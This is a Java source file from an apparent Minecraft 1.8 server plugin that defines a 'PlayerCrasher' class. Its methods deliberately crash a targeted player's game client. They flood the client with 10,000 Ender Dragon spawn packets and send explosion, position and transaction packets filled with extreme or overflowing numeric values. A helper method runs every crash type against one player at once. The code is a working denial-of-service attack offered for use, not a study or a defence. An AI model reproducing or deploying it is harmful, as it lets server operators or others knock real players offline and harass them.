package pisi.unitedmeows.seriex.util.crasher;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.function.Function;

import org.bukkit.Location;
import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import net.minecraft.server.v1_8_R3.EntityEnderDragon;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.Packet;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntityLiving;
import net.minecraft.server.v1_8_R3.PacketPlayOutTransaction;
import net.minecraft.server.v1_8_R3.Vec3D;

public class PlayerCrasher {
	public static void fuck(Player player) {
		Arrays.stream(CrashType.values()).forEach(value -> crash(player, value));
	}

	public static void crash(Player player, CrashType type) {
		EntityPlayer entityPlayer = ((CraftPlayer) player).getHandle();
		Packet<?>[] calculate = type.calculate(player);
		if (calculate != null) {
			Arrays.stream(calculate).forEach(entityPlayer.playerConnection::sendPacket);
		}
	}

	public enum CrashType {
		ENTITY((Player player) -> {
			for (int i = 0; i < 10_000; i++) {
				EntityEnderDragon dragon = new EntityEnderDragon(((CraftWorld) player.getWorld()).getHandle());
				Location location = player.getLocation();
				dragon.setLocation(location.getBlockX(), location.getBlockY(), location.getBlockZ(), i % 360, 90);
				PacketPlayOutSpawnEntityLiving packet = new PacketPlayOutSpawnEntityLiving(dragon);
				((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
			}
			return null;
		}),
		EXPLOSION((Player player) -> {
			double impossibleValue = Double.MAX_VALUE / 0x87D;
			double maxValue = 0x64 - 1E-4;
			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
			double[] values = {
						impossibleValue, maxValue, -impossibleValue, -maxValue
			};
			List<PacketPlayOutExplosion> packets = new ArrayList<>();
			for (double value : values) {
				PacketPlayOutExplosion explosion = new PacketPlayOutExplosion(value, value, value, impossibleFloat, Collections.emptyList(), new Vec3D(value, value, value));
				packets.add(explosion);
			}
			return packets.toArray(new PacketPlayOutExplosion[0]);
		}),
		POSITION((Player player) -> {
			double impossibleValue = Double.MAX_VALUE / 0x87D;
			double maxValue = 0x64 - 1E-4;
			float impossibleFloat = Float.MAX_VALUE - 1E-4F;
			double[] values = {
						impossibleValue, maxValue, -impossibleValue, -maxValue
			};
			List<PacketPlayOutPosition> packets = new ArrayList<>();
			for (double value : values) {
				PacketPlayOutPosition position = new PacketPlayOutPosition(value, value, value, impossibleFloat, impossibleFloat, Collections.emptySet());
				packets.add(position);
			}
			return packets.toArray(new PacketPlayOutPosition[0]);
		}),
		C0F((Player player) -> {
			List<PacketPlayOutTransaction> packets = new ArrayList<>();
			for (boolean fuck : new boolean[] {
						true, false
			}) {
				packets.add(new PacketPlayOutTransaction(0x7FFFFFFF, (short) 0x7FFF, fuck));
				packets.add(new PacketPlayOutTransaction(0x80000000, (short) 0x8000, fuck));
			}
			return packets.toArray(new PacketPlayOutTransaction[0]);
		});

		private Function<Player, Packet<?>[]> function;

		CrashType(Function<Player, Packet<?>[]> function) {
			this.function = function;
		}

		Packet<?>[] calculate(Player player) {
			return function.apply(player);
		}
	}
}
